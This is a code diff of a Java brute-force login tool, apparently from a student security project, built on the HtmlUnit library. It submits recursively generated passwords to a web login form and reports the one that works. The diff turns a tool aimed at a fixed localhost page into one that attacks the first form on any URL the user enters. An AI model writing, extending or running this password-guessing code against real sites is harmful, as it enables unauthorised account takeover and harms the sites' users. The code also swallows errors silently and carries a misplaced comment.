@@ -6,8 +6,10 @@ import com.gargoylesoftware.htmlunit.html.*;
 
 import java.io.IOException;
 import java.lang.reflect.Array;
+import java.net.MalformedURLException;
 import java.rmi.server.ExportException;
 import java.util.ArrayList;
+import java.util.Scanner;
 
 public class FormLogin {
 
@@ -27,6 +29,9 @@ public class FormLogin {
 
     boolean isBrute;
     boolean found;
+
+    Scanner scanner;
+
 
     public FormLogin(String url, String username, ArrayList<String> dictionary) {
         this.username = username;
@@ -64,11 +69,18 @@ public class FormLogin {
 //    public FormLogin(String, url )
 
     public void setup() {
+
+        scanner = new Scanner(System.in);
+
         client = new WebClient();
 
         try {
             HtmlPage page = (HtmlPage) client.getPage(url);
-            form = page.getFormByName("login");
+            form =  (HtmlForm) page.getElementsByTagName("form").get(0);
+        } catch (MalformedURLException e) {
+            System.out.println("Invalid URL. Try again: ");
+            url = scanner.next();
+            setup();
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -115,41 +127,45 @@ public class FormLogin {
 
     public void startBruteAttempts(String curr, int length) {
 
-        try {
+        if (!found) {
+            try {
 
-            form.getInputByName("username").setValueAttribute(username);
 
-            form.getInputByName("password").setValueAttribute(curr);
+                form.getInputByName("username").setValueAttribute(username);
 
-            HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);
+                form.getInputByName("password").setValueAttribute(curr);
 
-            Page result = button.click();
-            String resultUrl = result.getUrl().toString();
+                HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);
 
-            if (resultUrl.equals("http://localhost/3200-project/index.php")) {
-                System.out.println("Failed attempt with: " + username + ", " + curr);
+                Page result = button.click();
+                String resultUrl = result.getUrl().toString();
 
+                if (resultUrl.equals(url)) {
+                    System.out.println("Failed attempt with: " + username + ", " + curr);
+
+                } else {
+                    System.out.println("Success with username " + username + "! " + "Password is " + curr);
+                    found = true;
+                    return;
+                }
+            } catch (IOException e) {
+
+            }
+
+
+            // If the current string has reached it's maximum length
+            if (curr.length() == length) {
+                // Else add each letter from the alphabet to new strings and process these new strings again
             } else {
-                System.out.println("Success with username " + username + "! " + "Password is " + curr);
-                found = true;
-                return;
-            }
-        } catch (IOException e) {
-
-        }
-
-
-        // If the current string has reached it's maximum length
-        if (curr.length() == length) {
-            // Else add each letter from the alphabet to new strings and process these new strings again
-        } else {
-            for (int i = 0; i < characterSpace.length(); i++) {
-                String oldCurr = curr;
-                curr += characterSpace.charAt(i);
-                startBruteAttempts(curr, length);
-                curr = oldCurr;
+                for (int i = 0; i < characterSpace.length(); i++) {
+                    String oldCurr = curr;
+                    curr += characterSpace.charAt(i);
+                    startBruteAttempts(curr, length);
+                    curr = oldCurr;
+                }
             }
         }
+
     }
 
     public void startAttempts() {
